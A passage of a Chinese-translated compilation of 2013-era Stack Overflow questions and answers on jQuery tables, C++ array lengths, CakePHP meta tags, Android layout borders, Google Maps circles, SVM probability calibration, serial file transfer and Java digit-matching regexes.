Data 2, 2 ,2
</td>
<td nowrap="true">

 Data 3, 3, 3
 </td>
 <td nowrap="true">

 <img src="http://..." alt="" border="0" /> Data4
 </td>
 <td nowrap="true">

 Green
 </td>
 <td nowrap="true">

 Smith, John
 </td>
 <td nowrap="true">

 Fritz, Scott
 </td>
 <td nowrap="true">

 Data6
 </td>
<td nowrap="true">

 Data7
 </td>
 <td nowrap="true">

 Data 8
 </td>
 <td nowrap="true">

  Data9
 </td>
 <td nowrap="true">

 345
 </td>
 <td nowrap="true">

 764
 </td>
 </tr>
 </table> 
```

经过几次传递后，我进行了转换：

```
 $("table:contains('Unique')").removeClass("grid");
  $("table:contains('Unique')").find("th").parent("tr").addClass("hidden");
  $("table:contains('Unique')").find("img").addClass("hidden");
  $("table:contains('Unique') td[nowrap='true']").wrap("tr"); 
```

进入 DataX 的一列

现在我想将每个数据作为一行附加到这个现有表中：

```
 <div class="table-wrap"><table class="mytable"><tbody><tr><td colspan="1" class="tabletd"><strong>name1</strong></td></tr><tr><td colspan="1" class="tabletd"><strong>name 2</strong></td></tr><tr><td class="tabletd"><strong>name 3</strong></td></tr><tr><td colspan="1" class="tabletd"><strong>name4</strong></td></tr><tr><td class="tabletd"><strong>name2</strong></td></tr><tr><td colspan="1" class="tabletd"><strong>name5</strong></td></tr><tr><td colspan="1" class="tabletd"><strong>name 6</strong></td></tr><tr><td colspan="1" class="tabletd"><strong>name 7</strong></td></tr><tr><td colspan="1" class="tabletd"><strong>name 8 </strong></td></tr><tr><td colspan="1" class="tabletd"><strong>name 9<br /> </strong></td></tr><tr><td colspan="1" class="tabletd"><strong>name 10</strong></td></tr><tr><td colspan="1" class="tabletd"><strong>digit 1<br /> </strong></td></tr><tr><td colspan="1" class="tabletd"><strong>digit 2<br /> </strong></td></tr></tbody></table></div> 
```

所以在结果中我有第二个表中的一个单元格的行，一个来自第一个表。IE：

```
 Name 1      Data1
       Name 2      Data2
       Name 3      Data2 
```

ETC

非常感谢任何帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:00:38.480

看看 .append Jquery 方法：[http ://api.jquery.com/append/](http://api.jquery.com/append/)

您可能想要做类似的事情：

```
$(your_table).append($(your_data).wrap("<tr></tr>")); 
```

威奇将：

1.  使用 your_data 创建一个 jquery 对象
2.  将它们包含在一个元素中
3.  将所有这些添加到 your_table

# c++ - C++比较两个相似数组的长度

> ID：15111395
> 
> 赞同：1
> 
> 时间：2013-02-27T11:50:17.523
> 
> 标签：c++

我相信 Array1 和 Array2 的声明方式不同，但它们都具有相同的类型 - char。Array1 和 Array2 似乎都包含相同的确切值和相同数量的值。我不明白为什么它们的长度彼此不同。有人可以解释为什么吗？

```
char Array1[ ] = { 1, 2, 3, 4, 5 };
char Array2[ ] = "\x01\x02\x03\x04\x05";

std::cout << "Length of Array1 = " << sizeof( Array1 )/sizeof( *Array1 )
          << std::endl
          << "Length of Array2 = " << sizeof( Array2 )/sizeof( *Array2 ); 
```

输出：

```
Length of Array1 = 5
Length of Array2 = 6 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-27T11:52:20.427

由于字符串文字中存在隐式空终止字符，第二个数组有一个额外的字符。

从C++11 标准（n3337 草案）第*2.14.5 节字符串文字第 14 点开始：*

> 在任何必要的连接之后，在翻译阶段 7 (2.2) 中，**'\0' 被附加到每个字符串文字**中，以便扫描字符串的程序可以找到它的结尾。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-02-27T11:51:47.593

因为字符串以 NULL 结尾。您在字符串文字 '\0' 处有多余的字符

# cakephp - 如何在每个帖子中实现 og:tag？

> ID：15111400
> 
> 赞同：3
> 
> 时间：2013-02-27T11:50:23.787
> 
> 标签：cakephp

在 developer.ctp 文件中的 cakephp 项目中，我实现了 og:tags。我已经完成了这四种类型。当我添加一个新帖子时，当时我想实现每个帖子都应该有这样的 og 标签：

```
<meta property="og:type" content="discussion" />
<meta property="og:url" content="URL" />
<meta property="og:title" content="any title" />
<meta property="og:image" content="any comment"/> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:35:41.607

要显示元标记，请将其放在 default.ctp 布局的标题中：

```
<?php echo $this->fetch('meta'); ?> 
```

在您希望它们出现的视图中为每个元标记放置类似的内容：

```
<?php echo $this->Html->meta(array('name' => 'og:type', 'content' => 'discussion'), NULL, array('inline' => false)); ?> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-10-07T11:33:21.077

可以通过将一些特定选项传递给帮助程序来创建具有`property`属性而不是属性的元标记：`name``meta`

```
$this->Html->meta(array('property' => 'og:title', 'type' => 'meta', 'content' => 'My brilliant page', 'rel' => null)); 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-06-05T01:50:35.927

在 Cakephp 3.x 中，您可以简单地使用它

```
$this->Html->meta(null, null, [
    'property' => 'og:title',
    'content' => 'this is an article title',
    'block' => 'meta']); 
```

结果

```
<meta property="og:title" content="this is an article title"/> 
```

# android - 如何在 Android LinearLayout 周围创建边框？

> ID：15111402
> 
> 赞同：132
> 
> 时间：2013-02-27T11:50:26.833
> 
> 标签：android, android-layout, android-linearlayout

我有一个大布局，里面有一个较小的布局。

如何在小布局周围创建线条边框？

* * *

## 回答 #1

> 赞同：281
> 
> 时间：2013-02-27T11:54:15.873

当然。您可以为所需的任何布局添加边框。基本上，您需要创建一个自定义可绘制对象并将其作为背景添加到您的布局中。例子：

`customborder.xml`在您的可绘制文件夹中创建一个名为的文件：

```
<?xml version="1.0" encoding="UTF-8"?>
 <shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle">
   <corners android:radius="20dp"/> 
   <padding android:left="10dp" android:right="10dp" android:top="10dp" android:bottom="10dp"/>
   <stroke android:width="1dp" android:color="#CCCCCC"/>
 </shape> 
```

现在将其作为背景应用到较小的布局中：

```
<LinearLayout android:orientation="vertical"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:background="@drawable/customborder"> 
```

这应该够了吧。

另见：

*   [http://tekeye.biz/2012/add-a-border-to-an-android-layout](http://tekeye.biz/2012/add-a-border-to-an-android-layout)
*   [如何在除底部之外的线性布局周围添加边框？](https://stackoverflow.com/questions/10457135/how-to-add-border-around-linear-layout-except-at-the-bottom)

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2013-02-27T11:56:54.560

在drawable文件夹中创建名为border.xml的XML，如下所示：

```
<?xml version="1.0" encoding="utf-8"?>
 <layer-list xmlns:android="http://schemas.android.com/apk/res/android">
  <item> 
    <shape android:shape="rectangle">
      <solid android:color="#FF0000" /> 
    </shape>
  </item>   
    <item android:left="5dp" android:right="5dp"  android:top="5dp" >  
     <shape android:shape="rectangle"> 
      <solid android:color="#000000" />
    </shape>
   </item>    
 </layer-list> 
```

然后将其添加到线性布局中，如下所示：

```
 android:background="@drawable/border" 
```

* * *

## 回答 #3

> 赞同：11
> 
> 时间：2013-02-27T12:00:09.110

试试这个：

例如，让我们将 res/drawable/my_custom_background.xml 定义为：

(create this layout in your drawable folder) layout_border.xml

```
 <?xml version="1.0" encoding="utf-8"?>
<layer-list xmlns:android="http://schemas.android.com/apk/res/android">
    <item>
        <shape android:shape="rectangle">
            <stroke android:width="2dp" android:height="2dp"
                android:color="#FF0000" />
            <solid android:color="#000000" />
            <padding android:left="1dp" android:top="1dp" android:right="1dp"
                android:bottom="1dp" />

            <corners android:radius="1dp" android:bottomRightRadius="5dp"
                android:bottomLeftRadius="0dp" android:topLeftRadius="5dp"
                android:topRightRadius="0dp" />
        </shape>
    </item>

</layer-list> 
```

main.xml

```
<LinearLayout 
    android:layout_gravity="center"
    android:layout_width="200dp" 
    android:layout_height="200dp"   
    android:background="@drawable/layout_border" />
</LinearLayout> 
```

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2013-02-28T06:38:10.563

Create a one xml file in drawable folder

```
<stroke
    android:width="2dp"
    android:color="#B40404" />

<padding
    android:bottom="5dp"
    android:left="5dp"
    android:right="5dp"
    android:top="5dp" />

<corners android:radius="4dp" /> 
```

Now call this xml to your small layout background

android:background="@drawable/yourxml"

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-03-24T15:03:42.177

This solution will only add the border, the body of the LinearLayout will be transparent.

First, Create this border drawable in the drawable folder, `border.xml`

```
<?xml version="1.0" encoding="UTF-8"?>
<shape xmlns:android= "http://schemas.android.com/apk/res/android"
    android:shape="rectangle">
    <stroke android:width="2dp" android:color="#ec0606"/>
    <corners android:radius="10dp"/>
</shape> 
```

Then, in your LinearLayout View, add the border.xml as the background like this

```
<LinearLayout 
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:background="@drawable/border"> 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2016-09-28T11:28:56.073

you can do it Pragmatically also

```
 GradientDrawable gradientDrawable=new GradientDrawable();
   gradientDrawable.setStroke(4,getResources().getColor(R.color.line_Input)); 
```

Then set the background of layout as :

```
LinearLayout layout = (LinearLayout ) findViewById(R.id.ayout); layout .setBackground(gradientDrawable); 
```

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2018-01-14T14:33:35.513

I'll add Android docs link to other answers.

[https://developer.android.com/guide/topics/resources/drawable-resource.html#Shape](https://developer.android.com/guide/topics/resources/drawable-resource.html#Shape)

It describes all attributes of the Shape Drawable and `stroke` among them to set the border.

Example:

```
<shape xmlns:android="http://schemas.android.com/apk/res/android" android:shape="rectangle">
  <stroke android:width="1dp" android:color="#F00"/>
  <solid android:color="#0000"/>
</shape> 
```

Red border with transparent background.

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2019-05-16T22:28:32.423

Don't want to create a drawable resource?

```
 <FrameLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:background="@android:color/black"
    android:minHeight="128dp">

    <FrameLayout
      android:layout_width="match_parent"
      android:layout_height="match_parent"
      android:layout_margin="1dp"
      android:background="@android:color/white">

      <TextView ... />
    </FrameLayout>
  </FrameLayout> 
```

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2020-08-11T05:30:29.467

***Try This in your res/drawable***

```
 <?xml version="1.0" encoding="UTF-8"?><layer-list xmlns:android="http://schemas.android.com/apk/res/android">
<item>
  <shape
    android:shape="rectangle">
    <padding android:left="15dp"
        android:right="15dp"
        android:top="15dp"
        android:bottom="15dp"/>
    <stroke android:width="10dp"
        android:color="@color/colorPrimary"/>
  </shape>
</item><item android:left="-5dp"
        android:right="-5dp"
        android:top="-5dp"
        android:bottom="-5dp">
  <shape android:shape="rectangle">
    <solid android:color="@color/background" />
  </shape></item></layer-list> 
```

# google-maps - Google Maps API V3 - 通过点击事件更改圆半径

> ID：15111403
> 
> 赞同：3
> 
> 时间：2013-02-27T11:50:35.713
> 
> 标签：google-maps, google-maps-api-3, dom-events, mouseclick-event

我使用下面的代码通过半径为 60.000m 的单击事件显示圆形。

```
<html>
<head>
<div id="map"></div>
<style media="screen, projection" type="text/css">

map {
        width: 800px;
        height: 600px;
      }

</style>
</head>
<body>

<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false">

</script><script type="text/javascript">

        function initialize()   
        {
            var mapCenter = new google.maps.LatLng(40, -74);

            var map = new google.maps.Map(document.getElementById('map'), {
                'zoom': 7,
                'center': mapCenter,
                'mapTypeId': google.maps.MapTypeId.ROADMAP
            });

            // Add click event listener

            google.maps.event.addListener(map, "click", function (e) {

                var image = new google.maps.MarkerImage(  
                         'image/data/ConstBuilder/marker.png',
                          new google.maps.Size(40, 35),
                          new google.maps.Point(0, 0),
                          new google.maps.Point(20, 30)
                        );

                var shadow = new google.maps.MarkerImage(
                         'image/data/ConstBuilder/shadow.png',   
                          new google.maps.Size(62, 35),    
                          new google.maps.Point(0, 0),    
                          new google.maps.Point(0, 35)
                        );

                var marker = new google.maps.Marker({
                      draggable: true,
                      raiseOnDrag: false,
                      icon: image,
                      shadow: shadow,
                      map: map,
                      position: e.latLng
                });

                var circle = new google.maps.Circle({
                    map: map,
                    radius: 60000,
                    fillColor: '#AA0000'
                });

                circle.bindTo('center', marker, 'position');
            });
        };

        google.maps.event.addDomListener(window, 'load', initialize);
    </script>   
</body>
</html 
```

现在我想再添加一项功能 - 可以更改我的 Click 事件（显示圆圈）的半径值的单选按钮。我知道我需要使用`getRadius()`新事件之类的方法，我尝试在下面实现代码但没有成功。

```
google.maps.event.addDomListener(

document.getElementById('circle_radius'), 'change', function() {

circle.setRadius(document.getElementById('circle_radius').value)

}); 
```

谁能帮我找到解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-27T12:40:27.193

尝试用此替换您的代码，更改部分在正文标记之后。

```
<html>
<head>
<div id="map"></div>
<style media="screen, projection" type="text/css">

#map {
        width: 800px;
        height: 400px;
      }

</style>
</head>
<body>
<div>
30.000m <input type="radio" name="radiusBtns" id="radioBtn1" onclick="calcRadius(30000);" value="30" /><br />
60.000m<input type="radio" name="radiusBtns"  id="radioBtn2" onclick="calcRadius(60000);" value="60" /><br />
90.000m<input type="radio" name="radiusBtns"  id="radioBtn3" onclick="calcRadius(90000);" value="90" />
</div>
<script type="text/javascript" src="http://maps.google.com/maps/api/js?sensor=false">

</script><script type="text/javascript">
        var circle, map, pre_radius;
        function initialize()   
        {
            pre_radius = '60000';

            var mapCenter = new google.maps.LatLng(40, -74);

            map = new google.maps.Map(document.getElementById('map'), {
                'zoom': 7,
                'center': mapCenter,
                'mapTypeId': google.maps.MapTypeId.ROADMAP
            });

            // Add click event listenecal
            calcRadius(60000);

        };

        function calcRadius(radiusVal)
        {
            //console.log(document.getElementById("#radioBtn1").value);
            pre_radius = radiusVal;
            google.maps.event.addListener(map, "click", function (e) {

                var image = new google.maps.MarkerImage(  
                         'http://www.google.com/intl/en_us/mapfiles/ms/micons/blue-dot.png',
                          new google.maps.Size(40, 35),
                          new google.maps.Point(0, 0),
                          new google.maps.Point(20, 30)
                        );

                var shadow = new google.maps.MarkerImage(
                         'http://www.google.com/intl/en_us/mapfiles/ms/micons/blue-dot.png',   
                          new google.maps.Size(62, 35),    
                          new google.maps.Point(0, 0),    
                          new google.maps.Point(0, 35)
                        );

                var marker = new google.maps.Marker({
                      draggable: true,
                      raiseOnDrag: false,
                      icon: image,
                      map: map,
                      position: e.latLng
                });

                circle = new google.maps.Circle({
                    map: map,
                    radius: pre_radius,
                    fillColor: '#AA0000'
                });

                console.log(circle);

                circle.bindTo('center', marker, 'position');
            });
        }

        google.maps.event.addDomListener(window, 'load', initialize);
    </script>   
</body>
</html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-13T11:20:23.237

使用 Click 事件而不是 Change 事件。

希望它会起作用

谢谢

# android - 取消了订单，但仍显示在我拥有的物品中。安卓应用内购买

> ID：15111406
> 
> 赞同：4
> 
> 时间：2013-02-27T11:50:44.533
> 
> 标签：android, in-app-purchase, android-pay

我确实在我的应用程序中实现了 google play 的 v3 api in app purchase。一切正常，但奇怪的是当我使用我的测试帐户对其进行测试并从我的商家帐户中取消订单时。在我的应用程序中，它仍然显示该项目归测试用户所有，并且他能够使用所有高级功能。

关于如何摆脱这个的任何建议。

我尝试使用完全卸载并重新安装。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-11T23:25:06.033

我相信您可能会看到 Google Play 的设备端缓存。如果用户重新启动他的手机，它将清除它，否则您必须等待 Google Play 从 Google 服务器更新它的缓存。我有时会遇到相反的问题......用户购买，但由于某种原因，Google Play 从 Google 的服务器收到无效响应，并将未购买的结果缓存了几天。重新启动设备，在严重的情况下清除应用程序列表中的 Google PLAY 数据会导致 Play 从 Google 重新同步所有内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-27T12:01:27.197

如果您以前通过您的帐户购买过并且它是非消耗品，当您再次尝试购买时，服务器将向您发送状态“已购买物品”。（如恢复交易）

否则检查服务器响应的所有字段。

检查响应代码：http: [//developer.android.com/google/play/billing/billing_reference.html](http://developer.android.com/google/play/billing/billing_reference.html)

BILLING_RESPONSE_RESULT_USER_CANCELED 1 用户按下或取消对话

# python - sklearn.svm.svc 的函数 predict_proba() 如何在内部工作？

> ID：15111408
> 
> 赞同：46
> 
> 时间：2013-02-27T11:50:57.280
> 
> 标签：python, svm, scikit-learn

我正在使用[scikit-learn中的](http://scikit-learn.org/stable/)[sklearn.svm.svc](http://scikit-learn.org/stable/modules/generated/sklearn.svm.SVC.html)进行二进制分类。我正在使用它的 predict_proba() 函数来获得概率估计。谁能告诉我 predict_proba() 如何在内部计算概率？

* * *

## 回答 #1

> 赞同：77
> 
> 时间：2013-02-27T12:49:19.843

Scikit-learn 在内部使用 LibSVM，而这反过来又使用[Platt 缩放](http://citeseerx.ist.psu.edu/viewdoc/summary?doi=10.1.1.41.1639)，正如[LibSVM 作者在本说明](http://www.csie.ntu.edu.tw/~cjlin/papers/plattprob.pdf)中详述的那样，校准 SVM 以产生除类预测之外的概率。

Platt 缩放需要首先像往常一样训练 SVM，然后优化参数向量*A*和*B*，使得

```
P(y|X) = 1 / (1 + exp(A * f(X) + B)) 
```

其中`f(X)`是样本与超平面的有符号距离（scikit-learn 的`decision_function`方法）。您可能会认出这个定义中的[逻辑 sigmoid](https://en.wikipedia.org/wiki/Logistic_function)，逻辑回归和神经网络用于将决策函数转换为概率估计的函数相同。

请注意：`B`参数，“截距”或“偏差”或任何您喜欢的名称，可能会导致基于此模型的概率估计的预测与您从 SVM 决策函数中获得的预测不一致`f`。例如，假设`f(X) = 10`，则预测为`X`正；但如果`B = -9.9`和`A = 1`，那么`P(y|X) = .475`。我是凭空捏造这些数字，但您已经注意到这在实践中可能会发生。

实际上，Platt scaling 在交叉熵损失函数下在 SVM 的输出之上训练了一个概率模型。为了防止这个模型过拟合，它使用了内部五折交叉验证，这意味着用它来训练 SVM`probability=True`可能比普通的非概率 SVM 更昂贵。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2014-02-06T21:21:03.327

实际上我发现了一个稍微不同的答案，他们使用此代码将决策值转换为概率

```
'double fApB = decision_value*A+B;
if (fApB >= 0)
    return Math.exp(-fApB)/(1.0+Math.exp(-fApB));
else
     return 1.0/(1+Math.exp(fApB)) ;' 
```

这里 A 和 B 值可以在模型文件（probA 和 probB）中找到。它提供了一种将概率转换为决策值从而转换为铰链损失的方法。

使用 ln(0) = -200。

# java - 使用 tess4j 从彩色图像中读取文本

> ID：15111410
> 
> 赞同：-1
> 
> 时间：2013-02-27T11:51:15.967
> 
> 标签：java, ocr, tesseract

我能够从单色图像中读取文本，但无法从彩色图像中读取文本。我将不胜感激任何帮助...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-28T11:49:20.177

您可以使用[阈值](http://en.wikipedia.org/wiki/Thresholding_%28image_processing%29)对位图/图像进行预处理，然后再将其提供给库。然后它将是黑白的，并且识别应该很容易工作。

# embedded - 使用串口的嵌入式 Linux 文件传输（也用于 shell）

> ID：15111417
> 
> 赞同：3
> 
> 时间：2013-02-27T11:51:31.953
> 
> 标签：embedded, file-transfer

我想在我的桌面（Ubuntu）和嵌入式 Linux 之间传输文件。问题是桌面和嵌入式系统之间的唯一通信是使用串行端口。这个相同的串行端口用于使用 sh（over screen 或 putty）从桌面登录到嵌入式系统。

如果有帮助，嵌入式系统是运行 Angstrom 的 AT91SAM9G20EK。

我很感激任何建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:27:31.380

您可能想尝试其中一种 x/y/z-modem 系列协议。

免费套餐在这里：

[http://ohse.de/uwe/software/lrzsz.html](http://ohse.de/uwe/software/lrzsz.html)

您很可能也有 Angstrom 的套餐。

要传输文件，当连接到嵌入式设备时，您只需在嵌入式 linux 上启动程序 rz。

然后，在开发机器上的终端中启动 zmodem 协议并发送文件。传输完成后，目标机器上的 rz 程序将停止，您将在当前目录中找到该文件。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T15:02:25.897

您可以使用[PPP](http://en.wikipedia.org/wiki/Point-to-point_protocol)通过串行链路创建 TCP/IP 连接，这将允许同时透明地使用多个 TCP/IP 应用层协议，包括[FTP](http://en.wikipedia.org/wiki/File_Transfer_Protocol)、[Telnet](http://en.wikipedia.org/wiki/Telnet)、[rsh](http://en.wikipedia.org/wiki/Remote_Shell)或[ssh](http://en.wikipedia.org/wiki/Secure_shell)

# c - 时间复杂度 C

> ID：15111418
> 
> 赞同：2
> 
> 时间：2013-02-27T11:51:37.687
> 
> 标签：c, complexity-theory

```
void f(int n) {
 int x = n;
 while (x * x > n) {
   x /= 2;
   printf (“x cubed = %d\n”, x * x * x);
 }
 while (x > 0)
   x--;
 printf("hello %d\n", x);
} 
```

我不明白他们是如何得到**TETA(sqrt(n)) 的复杂性的**......有人可以正式地向我解释如何找到这个算法的复杂性，以及其他类似的......？我需要制作一个跟踪表吗？是否有任何网站提供有关算法和复杂性的示例？

10倍很多！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-27T11:55:27.137

当您退出第一个 while 循环时：

```
 while (x * x > n) {
   x /= 2;
   printf (“x cubed = %d\n”, x * x * x);
 } 
```

您将在间隔中拥有 x ，然后您将`[sqrt(n)/2, sqrt(n)]`执行下一个周期的 x 次迭代。第一个周期的复杂度为`log(n)`，因此总体复杂度是第二个周期定义的 sqrt(n) 的 theta（`log(n)`增长速度慢于`sqrt(n)`）。

# java - 如何检查字符串是否仅包含Java中的数字

> ID：15111420
> 
> 赞同：168
> 
> 时间：2013-02-27T11:51:42.437
> 
> 标签：java, string

在Java for String 类中有一个称为matches 的方法，如何使用此方法使用正则表达式检查我的字符串是否只有数字。我尝试了以下示例，但它们都返回了错误的结果。

```
String regex = "[0-9]";
String data = "23343453";
System.out.println(data.matches(regex)); 
```

* * *

```
String regex = "^[0-9]";
String data = "23343453";
System.out.println(data.matches(regex)); 
```

* * *

## 回答 #1

> 赞同：388
> 
> 时间：2013-02-27T11:53:19.143

尝试

```
String regex = "[0-9]+"; 
```

或者

```
String regex = "\\d+"; 
```

根据 Java*正则表达式*， `+`意思是“一次或多次”，`\d`意思是“一个数字”。

注意：“双反斜杠”是获得单个反斜杠的*转义序列*`\\d`- 因此，在 java String 中为您提供实际结果：`\d`

**参考：**

*   [Java 正则表达式](http://docs.oracle.com/javase/7/docs/api/java/util/regex/Pattern.html)

*   [Java 字符转义序列](http://docs.oracle.com/javase/tutorial/java/data/characters.html)

* * *

**编辑：**由于其他答案有些混乱，我正在编写一个测试用例，并将详细解释更多内容。

首先，如果您对此解决方案（或其他解决方案）的正确性有疑问，请运行此测试用例：

```
String regex = "\\d+";

// positive test cases, should all be "true"
System.out.println("1".matches(regex));
System.out.println("12345".matches(regex));
System.out.println("123456789".matches(regex));

// negative test cases, should all be "false"
System.out.println("".matches(regex));
System.out.println("foo".matches(regex));
System.out.println("aa123bb".matches(regex)); 
```

## 问题一：

> ### 是不是有必要添加`^`和`$`到正则表达式，所以它不会匹配 "aa123bb" ？

**不。**在java中，`matches`方法（在问题中指定）匹配一个完整的字符串，而不是片段。换句话说，没有必要使用`^\\d+$`（即使它也是正确的）。请参阅最后一个否定测试用例。

请注意，如果您使用在线“正则表达式检查器”，则其行为可能会有所不同。要在 Java 中匹配字符串的片段，您可以改用该`find`方法，此处详细描述：

[Java Regex中matches()和find()的区别](https://stackoverflow.com/questions/4450045/difference-between-matches-and-find-in-java-regex)

## 问题2：

> ### 这个正则表达式不会也匹配空字符串`""`吗？*

**不会。**正则表达式`\\d*`会匹配空字符串，但`\\d+`不会。星`*`号表示零或多个，而加号`+`表示一或多个。请参阅第一个否定测试用例。

## 问题 3

> ### 编译正则表达式模式不是更快吗？

**是的。**编译一次正则表达式模式确实更快，而不是每次调用`matches`，因此如果性能影响很重要，那么 a`Pattern`可以像这样编译和使用：

```
Pattern pattern = Pattern.compile(regex);
System.out.println(pattern.matcher("1").matches());
System.out.println(pattern.matcher("12345").matches());
System.out.println(pattern.matcher("123456789").matches()); 
```

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2013-02-27T11:53:50.023

您还可以使用Apache Commons中的[NumberUtil.isNumber(String str)](https://commons.apache.org/proper/commons-lang/javadocs/api-release/org/apache/commons/lang3/math/NumberUtils.html#isDigits(java.lang.String))

* * *

## 回答 #3

> 赞同：14
> 
> 时间：2016-02-02T10:07:58.590

使用正则表达式在性能方面的成本很高。尝试将字符串解析为长值是低效且不可靠的，并且可能不是您需要的。

我的建议是简单地检查每个字符是否是数字，使用 Java 8 lambda 表达式可以有效地完成什么：

```
boolean isNumeric = someString.chars().allMatch(x -> Character.isDigit(x)); 
```

* * *

## 回答 #4

> 赞同：11
> 
> 时间：2013-02-27T12:05:59.240

另一种尚未发布的解决方案：

```
String regex = "\\p{Digit}+"; // uses POSIX character class 
```

* * *

## 回答 #5

> 赞同：7
> 
> 时间：2013-02-27T11:52:46.460

```
Long.parseLong(data) 
```

并捕获异常，它处理减号。

尽管位数有限，但这实际上创建了一个可以使用的数据变量，我想这是最常见的用例。

* * *

## 回答 #6

> 赞同：7
> 
> 时间：2013-02-27T11:53:37.467

您必须允许多个数字（`+`符号），如：

```
String regex = "[0-9]+"; 
String data = "23343453"; 
System.out.println(data.matches(regex)); 
```

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2016-09-12T10:50:58.717

我们可以使用`Pattern.compile("[0-9]+.[0-9]+")`或`Pattern.compile("\\d+.\\d+")`。它们具有相同的含义。

模式 [0-9] 表示数字。与“\d”相同。'+' 表示它出现的次数更多。'。' 对于整数或浮点数。

试试下面的代码：

```
import java.util.regex.Pattern;

    public class PatternSample {

        public boolean containNumbersOnly(String source){
            boolean result = false;
            Pattern pattern = Pattern.compile("[0-9]+.[0-9]+"); //correct pattern for both float and integer.
            pattern = Pattern.compile("\\d+.\\d+"); //correct pattern for both float and integer.

            result = pattern.matcher(source).matches();
            if(result){
                System.out.println("\"" + source + "\""  + " is a number");
            }else
                System.out.println("\"" + source + "\""  + " is a String");
            return result;
        }

        public static void main(String[] args){
            PatternSample obj = new PatternSample();
            obj.containNumbersOnly("123456.a");
            obj.containNumbersOnly("123456 ");
            obj.containNumbersOnly("123456");
            obj.containNumbersOnly("0123456.0");
            obj.containNumbersOnly("0123456a.0");
        }

    } 
```

输出：

```
"123456.a" is a String
"123456 " is a String
"123456" is a number
"0123456.0" is a number
"0123456a.0" is a String 
```

* * *

## 回答 #8

> 赞同：2
> 
> 时间：2017-03-29T16:13:16.247

根据 Oracle 的 Java 文档：

```
private static final Pattern NUMBER_PATTERN = Pattern.compile(
        "[\\x00-\\x20]*[+-]?(NaN|Infinity|((((\\p{Digit}+)(\\.)?((\\p{Digit}+)?)" +
        "([eE][+-]?(\\p{Digit}+))?)|(\\.((\\p{Digit}+))([eE][+-]?(\\p{Digit}+))?)|" +
        "(((0[xX](\\p{XDigit}+)(\\.)?)|(0[xX](\\p{XDigit}+)?(\\.)(\\p{XDigit}+)))" +
        "[pP][+-]?(\\p{Digit}+)))[fFdD]?))[\\x00-\\x20]*");
boolean isNumber(String s){
return NUMBER_PATTERN.matcher(s).matches()
} 
```

* * *

## 回答 #9

> 赞同：-1
> 
> 时间：2018-03-23T16:21:25.490

试试这部分代码：

```
void containsOnlyNumbers(String str)
{
    try {
        Integer num = Integer.valueOf(str);
        System.out.println("is a number");
    } catch (NumberFormatException e) {
        // TODO: handle exception
        System.out.println("is not a number");
    }

} 
```

# java - 用于实现系统服务器端的 Java RMI

> ID：15111423
> 
> 赞同：0
> 
> 时间：2013-02-27T11:51:49.577
> 
> 标签：java, architecture, client-server, rmi

我正在开发系统，它由客户端（用 JavaFX 编写）和服务器组成。现在我要实现服务器。用户将下载客户端。客户端将与服务器通信（只有一台服务器和许多客户端）。服务器将与数据库通信并发送结果。服务器将支持身份验证和不同的请求（当然不是 http）。用 Java RMI 实现服务器是个好主意吗？如果没有，你能告诉我关于服务器实现的任何好主意吗？

非常感谢未来的问题！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-01T13:27:05.833

RMI 有点传统，但对我来说仍然很强大，它有一些缺点。但是，尽管有 RMI，您还有机会使用 java 套接字类吗？就像一个客户端 - 服务器应用程序......

# asp.net - 在图像标签上显示图像字节（）的问题

> ID：15111430
> 
> 赞同：0
> 
> 时间：2013-02-27T11:52:13.457
> 
> 标签：asp.net, database, image, drag-and-drop, xmlhttprequest

我正在尝试在客户端显示来自数据库的图像，但是，我一直在使用我发现的多种示例，但都没有工作，没有显示图像。我看到的最后一个例子是这样的：http: [//www.codeproject.com/Tips/445876/Auto-bind-byte-to-asp-Image](http://www.codeproject.com/Tips/445876/Auto-bind-byte-to-asp-Image)

我完全理解这个例子，但图像仍然没有显示。

有人帮我解决这个问题吗？

总之，我使用的是 HTML5 拖放文件。通过 FormData 对象中的 XMLHttpRequest 发送文件。一个处理程序在 byte() 中获取这些文件并存储在 SQL 数据库中。

**客户端代码：**

```
$("#btnUploadFile").click(function () {
    if (files.length <= 0) {
        alert("Debe seleccionar algún fichero para subirlo.");
    } else {
        var expID = $("#ContentPlaceHolder1_hfExpId").val();
        var formData = new FormData();
        for (var i = 0; i < files.length; i++) {
            alert(files[i].name);
            formData.append('file', files[i]);
        }
        var xhr = new XMLHttpRequest();
        xhr.open('POST', "FileHandler.ashx", true);
        xhr.overrideMimeType('text/plain; charset=x-user-defined-binary');
        xhr.setRequestHeader("ExpedienteID", expID);
        xhr.onload = function () {
            if (xhr.status === 200) {
                RefreshFilePanel();
            } else {
                console.log('Something went terribly wrong...');
            }
        };
        xhr.send(formData);
    }; 
```

**处理代码：**

```
 Public Sub ProcessRequest(ByVal context As HttpContext) Implements IHttpHandler.ProcessRequest
    Dim documentBytes As Byte()
